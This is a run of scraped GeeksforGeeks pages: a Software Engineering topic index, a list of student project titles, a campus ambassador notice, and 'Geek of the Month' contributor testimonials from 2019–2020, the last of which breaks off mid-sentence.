Software Engineering - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Introduction of Software Engineeringexpand_moreSoftware EngineeringSoftware Engineering | Introduction to Software EngineeringSoftware Engineering | Classification of SoftwareSoftware Development Models & Architectureexpand_moreSoftware Engineering | Classical Waterfall ModelSoftware Engineering | Iterative Waterfall ModelSoftware Engineering | Spiral ModelSoftware Engineering | Incremental process modelSoftware Engineering | Rapid application development model (RAD)Software Engineering | RAD Model vs Traditional SDLCSoftware Engineering | Agile Development ModelsSoftware Engineering | Agile Software DevelopmentSoftware Engineering | Extreme Programming (XP)Software Engineering | SDLC V-ModelSoftware Engineering | Comparison of different life cycle modelsSoftware Engineering | User Interface DesignSoftware Engineering | Coupling and CohesionSoftware Engineering | Information System Life CycleSoftware Engineering | Database application system life cycleSoftware Engineering | Pham-Nordmann-Zhang Model (PNZ model)Software Engineering | Schick-Wolverton software reliability modelSoftware Project Management(SPM)expand_moreSoftware Engineering | Project Management ProcessSoftware Engineering | Project size estimation techniquesSoftware Engineering | System configuration managementSoftware Engineering | COCOMO ModelSoftware Engineering | Capability maturity model (CMM)Integrating Risk Management in SDLC | Set 1Integrating Risk Management in SDLC | Set 2Integrating Risk Management in SDLC | Set 3Software Engineering | Role and Responsibilities of a software Project ManagerSoftware Engineering | Software Project Management ComplexitiesSoftware Engineering | Quasi renewal processesSoftware Engineering | Reliability Growth ModelsSoftware Engineering | Jelinski Moranda software reliability modelSoftware Engineering | Goel-Okumoto ModelSoftware Engineering | Mills’ Error Seeding ModelBasic fault tolerant software techniquesSoftware Engineering | Software MaintenanceSoftware Requirementsexpand_moreSoftware Engineering | Requirements Engineering ProcessSoftware Engineering | Classification of Software RequirementsHow to write a good SRS for your ProjectSoftware Engineering | Quality Characteristics of a good SRSSoftware Engineering | Requirements ElicitationSoftware Engineering | Challenges in eliciting requirementsSoftware Testing and Debuggingexpand_moreSoftware Engineering | Seven Principles of software testingSoftware Engineering | Testing GuidelinesSoftware Engineering | Black box testingSoftware Engineering | White box TestingSoftware Engineering | DebuggingSoftware Engineering | Selenium: An Automation toolSoftware Engineering | Integration TestingSE GATE Questionsexpand_moreSoftware Engineering Software Engineering Recent Articles on Software Engineering Topics: Introduction Software Development Life Cycle Software Project Management Software Requirements Software Testing and Debugging: Introduction: Introduction to Software Engineering Classification of Software Software Development Models & Architecture: Classical Waterfall Model Iterative Waterfall Model Spiral Model Incremental process model Rapid application development model(RAD) RAD Model vs Traditional SDLC Agile Development Models Agile Software Development Extreme Programming (XP) SDLC V-Model Comparison of different life cycle models User Interface Design Coupling and Cohesion Information System Life Cycle Database application system life cycle Pham-Nordmann-Zhang Model (PNZ model) Schick-Wolverton software reliability model Software Project Management(SPM): Project Management Process Project size estimation techniques System configuration management COCOMO Model Capability maturity model (CMM) Integrating Risk Management in SDLC | Set 1 Integrating Risk Management in SDLC | Set 2 Integrating Risk Management in SDLC | Set 3 Role and Responsibilities of a software Project Manager Software Project Management Complexities Quasi renewal processes Reliability Growth Models Jelinski Moranda software reliability model Schick-Wolverton software reliability model Goel-Okumoto Model Mills’ Error Seeding Model Basic fault tolerant software techniques Software Maintenance Software Requirements: Requirements Engineering Process Classification of Software Requirements How to write a good SRS for your Project Quality Characteristics of a good SRS Requirements Elicitation Challenges in eliciting requirements Software Testing and Debugging: Seven Principles of software testing Testing Guidelines Black box testing White box Testing Debugging Selenium: An Automation tool Integration Testing If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Difference between List VS Set VS Tuple in PythonTop 5 IDEs for C++ That You Should Try Once Most Visited Articles Check whether count of odd and even factors of a number are equalHow To Create a Countdown Timer Using Python?Maximum points of intersections possible among X circles and Y straight linesHow to find index of a given element in a Vector in C++Find the duration of difference between two dates in Java room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Campus Ambassador Program by GeeksforGeeks - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Campus Ambassador Program by GeeksforGeeks Apply Now Apply Now Know More My Personal Notes arrow_drop_up Save Load Comments room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Computer Science Projects - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Computer Science Projects Recent Project Articles ! Topics : C++ Projects Java Projects Python Projects Project Ideas Misc C++ Projects : OpenCV C++ Program for Face Detection OpenCV C++ Program for coin detection OpenCV C++ Program to blur an image OpenCV C++ Program to create a single colored blank image OpenCV C++ Program to blur a Video OpenCV C++ Program to play a video Creating a PortScanner in C Student Data Management in C++ OpenGL program for Simple Ball Game Implementation of Minesweeper Game Finding cabs nearby using Great Circle Distance formula Program to remotely Power On a PC over the internet using the Wake-on-LAN protocol. Java Projects : A Group chat application in Java Generating Password and OTP in Java Creative Programming In Processing | Set 1 (Random Walker) Creative Programming In Processing | Set 2 (Lorenz Attractor) Python Projects : Make Notepad using Tkinter Color game using Tkinter in Python Python | Message Encode-Decode using Tkinter XML parsing in Python Desktop Notifier in Python Hangman Game in Python Junk File Organizer in Python Browser Automation Using Selenium Tracking bird migration using Python-3 Twitter Sentiment Analysis using Python Image Classifier using CNN Implementing Photomosaics Working with Images in Python OpenCV Python Program to blur an image Opencv Python program for Face Detection Cartooning an Image using OpenCV – Python OpenCV Python Program to analyze an image using Histogram OpenCV Python program for Vehicle detection in a Video frame DNA to Protein in Python 3 Viruses – From Newbie to pro Handling Ajax request in Django Working with zip files in Python Morse Code Translator In Python Simple Chat Room using Python Creating a Proxy Webserver in Python | Set 1 Creating a Proxy Webserver in Python | Set 2 Project Idea | Audio to Sign Language Translator Understanding Code Reuse and Modularity in Python 3 Multi-Messenger : A python project, messaging via Terminal Movie recommendation based on emotion in Python Implementing Web Scraping in Python with BeautifulSoup Computer Vision module application for finding a target in a live camera Project Ideas : Project Idea | (Static Code Checker for C++) Project Idea | (Dynamic Hand Gesture Recognition using neural network) Project Idea | God’s Eye Project Idea | (Ca-solutions) Project Idea | College Connect Project Idea | Empower Illiterate Project Idea | (Remote Lab Assistance) Project Idea | (Project Approval System) Project Idea | (Online Course Registration) Project Idea | (Universal Database Viewer) Project Idea | Sun Rise/Set Time Finder Project Idea | Automatic Youtube Playlist Downloader Project Idea | Aadhaar Thumb: A Platform to All Services Project Idea | (Health services & Medical outcome monitoring) Project Idea| (Magical Hangouts: An Android Messaging App) Project Idea | JamFree Project Idea | AI Therapist Project Idea | Get Your Logo Project Idea | ( Client Master) Project Idea | (A Game of Anagrams ) Project Idea | Breakout game in Python Project Idea | (Games using Hand Gestures) Project Idea | Amanda: A Smart Enquiry Chatbot Project Idea | (A.T.L.A.S: App Time Limit Alerting System) Project Idea | Sign Language Translator for Speech-Impaired Project Idea | Personality Analysis using hashtags from tweets Project Idea | Recommendation System based on Graph Database Creating a C/C++ Code Formatting tool with help of Clang tools Project Idea (Augmented Reality – QR Code Scanner) Project Idea (Augmented Reality – ARuco Code Detection and Estimation) Project Idea | (CSE Webnode) Project Idea | College Network Project Idea | (Online UML Designing Tool) Project Idea | Voice Based Email for Visually Challenged Project Idea | Assist Bot Project Idea | Social-Cop Project Idea | MediTrack Project Idea | (CAPTURED) Project Idea | LinkBook Project Idea | (Trip Planner) Project Idea | EveMythra Bot Project Idea | Green Rides Project Idea | E-Ration Shop Project Idea | Smart Elevator Project Idea | Get Me Through Project Idea | Innovate Email Project Idea | NextVAC Platform Project Idea | League of Fitness Project Idea | (A Personal Assistant) Project Idea | (Smart Restaurants) Project | Scikit-learn – Whisky Clustering Creating a Calculator for Android devices Project Idea | Airport Security Using Beacon Project Experience | (Brain Computer Interface) Project Idea | ( True Random Number Generator) Project Idea | Distributed Downloading System Project Idea | (Personalized real-time update system) Project Idea | Attendance System Using Smart Card Project Idea | (Detection of Malicious Network activity) Project Idea | Smart Waste Management System Project Idea – Bio-Hashing : Two factor authentication Project Idea | noteSort (Classify handwritten notes) Project Idea | Health Application powered by IBM Watson Project Idea | Collaborative Editor Framework in Real Time Project Idea | Department Data Analysis Mobile Application Project Idea | Analysis of Emergency 911 calls using Association Rule Mining Crop monitoring and smart farming using IoT MyHelper (Access your phone from anywhere without Internet) Project Idea | (Robust Pedestrian detection) Project Idea | ( Character Recognition from Image ) Project Idea | (Model based Image Compression of Medical Images) Project Idea | Motion detection using Background Subtraction Techniques Project Idea | (Optimization of Object-Based Image Analysis with Super-Pixel for Land Cover Mapping) Misc : A Number Link Game Designing Use Cases for a Project Building a Basic Chrome Extension How to write a good SRS for your Project Creating WYSIWYG Document Editor | Natural Language Programming My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Geek of the Month - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Geek of the Month Geek of the Month Program You guys have given a lot to us, now it’s our turn to reward you back for your hard work. Geek of the month program exclusively appreciates the contributors who have been continuously putting their effort to make us better and better and much better. Be it articles, algorithms, codes, Q&A, blogs, info graphics, comments or suggestions ,these guys have proved their mettle in some place or the other every now and then. Benefits for Geek of the Month Selected candidates will be given a rewarding certificate. Geek of the month can tag or credit this honor at his/her resume, email signatures, LinkedIn profile, blogs, Facebook pages, personal pages etc. Paid internship opportunity at GeeksforGeeks. How can I become “Geek of the month”? Geek of the month is decided by the end of every month on the basis of the number of published articles by a contributor and quality of content, the latter being the principal metric. You can also win this reputed title and add stars to your resume. Start today and share your knowledge by writing articles. Geek of the month – November 2020 Testimonial: I am very much thankful to the Geeks Team for felicitations and awarding me with the “Geek of the month” title. Since I started contributing technical articles, it gave me immense satisfaction and confidence in technical skills, and learning a lot in web technologies and computer science. GeeksForGeeks is a specialized platform for people returning to work or preparing for higher studies with a proper work-life balance. I truly enjoyed the phase which involved my role as a technical content reviewer and freelance writer. Once again thanking the GeeksForGeeks team for giving me this opportunity and I would love to contribute or take part in the future as well. Certificate : Geetanjali Biswal, Published Articles Geek of the month – October 2020 Testimonial: I am grateful to team GeeksforGeeks for awarding me with the title “Geek of the Month”. I feel amazing receiving this felicitation. So when I started writing articles for GeeksforGeeks the main thing that I had in my mind was my personal growth in computer science fundamentals and the joy of giving back to the community. I have learned how to express my thoughts more clearly and succinctly. My concepts in dynamic programming have definitely got better because of the learning I used to do before writing an article to publish on the GfG website. I have loved writing high-quality articles for GeeksforGeeks and would love to continue doing so in the future as well. Certificate : Hemanth Gadarla, Published Articles Geek of the month – September 2020 Testimonial: It is a huge honor for me to receive the title ‘Geek of the Month’. I would like to thank the GeeksforGeeks team for providing this amazing platform to share my knowledge. Writing articles on GeeksforGeeks enhanced my technical skills a lot. And, the amount of reach and exposure one can get through this platform is exceptional. Once again, I would like to thank the entire GeeksforGeeks team for this amazing title. And, I strongly suggest to viewers, enhance your technical skills by sharing your knowledge through GeeksforGeeks.You will never regret doing a good deed. Certificate : Sonu George, Published Articles Geek of the month – August 2020 Testimonial: I am much obliged and grateful to be honoured with the esteemed title of “Geek of the Month” by GeeksforGeeks. I still remember the day when I started writing articles on GeeksforGeeks. A few months ago I was thinking to start with technical content writing and to write articles that are public and available for free and then I come up with GeeksforGeeks. I always wanted to share my knowledge with the world and GeeksforGeeks gave me the platform for the same. I started writing articles here and I am really impressed with the User Interface of the dashboard and easy to use portal. And it feels good when your work is appreciated and that is what GeeksforGeeks did after each of my articles. Even a few of my articles like Top 10 Kali Linux Tools For Hacking were featured on GeeksforGeeks home page and also writing these articles boosted up my knowledge of Linux and Ethical Hacking as well. All this motivated me to keep writing articles and with each article, my skill set was just leveling up. The best part of this journey is that I have a mentor Anshul sir with me who helped me out to keep myself motivated to write more and more articles. Concluding this I Thank the whole GeeksforGeeks team to honour me with this distinguished title of “Geek of the month” and I assure that I will keep spreading my knowledge by writing more and more articles and will request the readers as well to start writing articles so that they could also contribute for the development of the youth of the nation. Certificate : Manav Agarwal, Published Articles Geek of the month – July 2020 Testimonial: I am grateful to team GeeksforGeeks for awarding me with this prestigious title “Geek of the Month”. I love to write articles on GeeksforGeeks platform. Writing articles also enhances my technical skills, writing articles on a certain topic clears everything about that topic. I am really glad to be a part of GeeksforGeeks. The best thing I liked about this platform is that contributions are always appreciated and valued. After every published article, I feel really motivated to write more and more. I also learnt how to write more readable code and in a proper manner. Thank you team GeeksforGeeks for such an opportunity, I would love to contribute to this amazing platform in future as well. Certificate : Tarandeep Singh, Published Articles Geek of the month – June 2020 Testimonial: I would like to thank the GfG team for selecting me for the “Geek of the Month” title. It’s an ultimate honour for me to receiving this felicitation. It was my amazing experience to write an article on GeeksforGeeks. When I started to write an article on GeeksforGeeks, the main thing that I had in my mind is “What’s the use of that knowledge what you can’t share with others” so I decided to provide my knowledge and experience to viewers who visit the GFG platform to learn the concepts of coding. Writing articles on GFG taught me a lot, such as expressing my thought into words with clarity. The main thing that I have learned is to write clean and formatted code with necessary comments. During the time of writing articles, I have actually learned a lot in Data structures and Algorithms who helped me to boost my programming Knowledge. I have also done the internship in GeeksforGeeks. During the internship, I have written so many articles based on Data structure and Algorithms ex: tree, graph, dynamic programming, Trie, etc. When my articles gets published on GFG then it used to be a motivation for me to write more articles. Finally, I would like to thanks to GFG community who published my articles with their great efforts and also helped me to improve my mistakes during content writing. I would like to request to viewers to write an article on GFG, this is the place where your contribution will never get ignored. Wishing Team GeeksforGeeks and their readers, lot of Good Luck and Thanks to the development team for managing this platform so wonderfully. Certificate : Mohd. Mudassir, Published Articles Geek of the month – May 2020 Testimonial: I am highly grateful to GeeksForGeeks for giving me such an unprecedented title. The best part about writing articles for GeeksForGeeks for me personally is that it provides me with an enormous reach, hence i have an opportunity to spread my knowledge to various parts of the country and the world perhaps. And moreover, you don’t need to have a masters degree to impart knowledge out here, anybody and everybody capable enough can write and every article is properly read, thus providing everyone a platform where even the slightest of knowledge can be shared. I wish the team of GeeksForGeeks my best wishes and i would recommend all the readers to learn, grow and contribute as much as they can. Certificate : Muskan Garg, Published Articles Geek of the month – April 2020 Testimonial: A big thank you to GeeksforGeeks for awarding me with this title. It’s been an amazing journey to contribute to this amazing platform in any way possible. The best way to learn is to share and the best way to share is through GeeksforGeeks. The amount of reach and exposure provided here is unprecedented. I came to know about the Technical Content writing internship through their website and I am so grateful that I was selected for the role. The way I construct problems, the way I code solutions have become very elaborate and easy to understand just because of writing content here. If you have even the most minuscule information that you feel like sharing, this is the place for you. Believe me, being a part of this place is worth it. Thanks to the wonderful team for managing this platform so wonderfully. Cheers! Certificate : Tejas Sardana, Published Articles Geek of the month – March 2020 Testimonial: I would like to thank GeeksforGeeks for awarding me with this amazing title and I am glad that I am a part of it. Writing articles on such a platform, provides me great help in enhancing my technical skills. My experience at GeeksforGeeks has been more than this. I have learnt how to express my thoughts more clearly and smoothly. I learnt how to write clean and easy to understand code. “What’s the use of knowledge if you can’t share it with others?”. Geeksforgeeks gave me the perfect opportunity to achieve that. Certificate : Rakshit Arora, Published Articles Geek of the month – February 2020 Testimonial: I am grateful to geeksforgeeks and it’s team for rewarding me with the denomination “Geek of the month”. However, I came to know about geeksforgeeks internship from one friend of mine and I started doing it as this content writing work doesn’t require any prior knowledge, you just need to understand the topic you are writing from any authenticated source. Moreover, this helped me in understanding my potential and gaining a lot of knowledge out of the box. I like writing contents on geeksforgeeks and so, I hope to continue it in future too. Certificate : Nidhi Singh, Published Articles Geek of the month – January 2020 Testimonial: First of all, I would like to thank GeeksforGeeks team for rewarding me this cool and beautiful title. I came to know about GfG Technical Scripter (Work From Home) job from one of my class friends. I started writing at GfG just for an internship certificate and some remuneration. But with the time it enhanced my technical skills (the theoretical and coding part) and English proficiency (Written). Working with GeeksforGeeks team as a Technical Content Writer has been a wonderful experience. This cool reward has encouraged me to write more qualitative articles. Once again I would like to thank GeeksforGeeks team for this awesome title. Certificate : Manish Kumar Chaudhary, Published Articles Geek of the month – December 2019 Testimonial: I feel blessed to be a part of GeeksforGeeks’s technical content writing interns. It’s not an easy job to get your articles published here in GeeksforGeeks, perhaps one of the best websites to learn Computer Science from, especially for people like me who don’t belong to the Computer Science branch, 